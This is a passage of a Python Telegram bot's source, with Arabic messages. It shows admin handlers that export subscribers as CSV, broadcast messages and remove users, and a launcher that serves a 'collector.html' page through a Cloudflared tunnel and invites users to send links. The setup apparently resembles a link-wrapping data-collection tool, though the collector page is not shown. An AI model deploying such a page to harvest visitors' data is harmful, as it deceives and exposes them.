    bot.answer_callback_query(call.id, "أرسل ID المشترك الجديد الآن", show_alert=True)
    bot.send_message(call.from_user.id, "📝 أرسل معرف المشترك الجديد (ID) فقط:")


@bot.callback_query_handler(func=lambda call: call.data == 'admin_view_subscribers')
def admin_view_subscribers(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ غير مصرح لك", show_alert=True)
        return

    subscriber_ids = [sid for sid in sorted(subscribers) if sid not in ADMIN_IDS]
    if not subscriber_ids:
        bot.answer_callback_query(call.id, "لا يوجد مشتركين حالياً", show_alert=True)
        return

    count_text = f"📊 عدد المشتركين: {len(subscriber_ids)}"
    bot.answer_callback_query(call.id, count_text, show_alert=False)

    lines = ["id,name,username"]
    for sid in subscriber_ids:
        details = subscriber_details.get(sid, {})
        name = (details.get('name') or 'غير معروف').replace('\n', ' ').replace(',', ' ')
        username = (details.get('username') or 'لا يوجد').replace('\n', ' ').replace(',', ' ')
        lines.append(f"{sid},{name},{username}")

    content = "\n".join(lines).encode('utf-8')
    file_obj = BytesIO(content)
    file_obj.name = 'subscribers.csv'
    bot.send_document(
        call.from_user.id,
        file_obj,
        caption="📄 ملف المشتركين بصيغة CSV",
        visible_file_name='subscribers.csv'
    )


@bot.callback_query_handler(func=lambda call: call.data == 'admin_broadcast')
def admin_broadcast(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ غير مصرح لك", show_alert=True)
        return

    pending_admin_actions[call.from_user.id] = 'broadcast'
    bot.answer_callback_query(call.id, "أرسل الرسالة الآن", show_alert=True)
    bot.send_message(call.from_user.id, "📢 أرسل الرسالة التي تريد إرسالها إلى جميع المشتركين:")


@bot.callback_query_handler(func=lambda call: call.data == 'admin_broadcast_photo')
def admin_broadcast_photo_button(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ غير مصرح لك", show_alert=True)
        return

    pending_admin_actions[call.from_user.id] = 'broadcast_photo'
    bot.answer_callback_query(call.id, "أرسل الصورة الآن", show_alert=True)
    bot.send_message(call.from_user.id, "🖼️ أرسل الصورة التي تريد إرسالها إلى جميع المشتركين، ويمكنك كتابة caption اختياري:")


@bot.callback_query_handler(func=lambda call: call.data == 'admin_remove_subscriber_menu')
def admin_remove_subscriber_menu(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ غير مصرح لك", show_alert=True)
        return

    subscriber_ids = [sid for sid in sorted(subscribers) if sid not in ADMIN_IDS]
    if not subscriber_ids:
        bot.answer_callback_query(call.id, "لا يوجد مشتركين حالياً", show_alert=True)
        return

    keyboard = InlineKeyboardMarkup()
    for sid in subscriber_ids:
        label = get_subscriber_display_name(sid)
        keyboard.add(InlineKeyboardButton(f"🗑️ {label} ({sid})", callback_data=f"admin_remove_{sid}"))

    bot.send_message(call.from_user.id, "👥 اختر المشترك الذي تريد حذفه:", reply_markup=keyboard)
    bot.answer_callback_query(call.id, "تم فتح قائمة الإزالة", show_alert=False)


@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_remove_'))
def admin_remove_subscriber(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ غير مصرح لك", show_alert=True)
        return

    sid = call.data.split('_')[-1]
    try:
        sid = int(sid)
    except ValueError:
        bot.answer_callback_query(call.id, "ID غير صالح", show_alert=True)
        return

    if sid in subscribers:
        subscribers.remove(sid)
        save_subscribers()
        bot.answer_callback_query(call.id, f"✅ تم حذف المشترك {sid}", show_alert=True)
        bot.send_message(call.from_user.id, f"✅ تم إزالة المشترك: {sid}")
    else:
        bot.answer_callback_query(call.id, "المشترك غير موجود", show_alert=True)

# ============================================
# 🌩️ تشغيل Cloudflared
# ============================================

# ============================================
# 🚀 تشغيل كل شيء معاً
# ============================================

def run_all():
    """تشغيل السيرفر والبوت وCloudflared معاً"""
    print("=" * 50)
    print("🚀 تشغيل النظام المتكامل...")
    print("=" * 50)

    port = get_runtime_port()

    # 1. التحقق من وجود ملف collector.html
    if not os.path.exists('collector.html'):
        print("❌ ملف collector.html غير موجود!")
        print("📥 تأكد من وجود الملف في نفس المجلد")
        return

    # 2. تشغيل السيرفر في خيط منفصل
    print("🔄 تشغيل السيرفر...")
    threading.Thread(target=lambda: app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False
    ), daemon=True).start()

    # 3. انتظار السيرفر
    time.sleep(2)
    print(f"✅ السيرفر المحلي شغال على http://localhost:{port}")
    
    # 4. تشغيل خدمة النفق (Cloudflared) أو استخدام الرابط الموجود
    print("🌩️ يجرب استخدام رابط السيرفر الخارجي أو Cloudflared...")
    threading.Thread(target=run_tunnel, daemon=True).start()
    
    # 5. انتظار الرابط العام أو الرابط الموجود
    time.sleep(5)
    server_url = get_server_url()
    if server_url:
        print(f"✅ الرابط العام: {server_url}")
    else:
        print("⚠️ لم يتم الحصول على رابط عام، لن يتم إنشاء روابط خارجية حتى تثبت Cloudflared أو تستخدم /setserver https://your-domain.com.")
    
    # 6. تشغيل البوت
    print("🤖 تشغيل بوت التليجرام...")
    print("=" * 50)
    print("✅ النظام جاهز!")
    print(f"🤖 البوت: @{bot.get_me().username}")
    print(f"🔗 السيرفر: {server_url}")
    print("=" * 50)
    print("📨 أرسل أي رابط للبوت وابدأ!")
    
    # تشغيل البوت (حلقة لا نهائية)
    while True:
        try:
            bot.polling(none_stop=True, interval=1)
        except Exception as e:
            print(f"❌ خطأ في البوت: {e}")
            time.sleep(5)

# ============================================
# 🎯 المدخل الرئيسي
# ============================================

if __name__ == '__main__':
    try:
        run_all()
    except KeyboardInterrupt:
        print("\n🛑 تم إيقاف النظام")
    except Exception as e:
        print(f"❌ خطأ: {e}")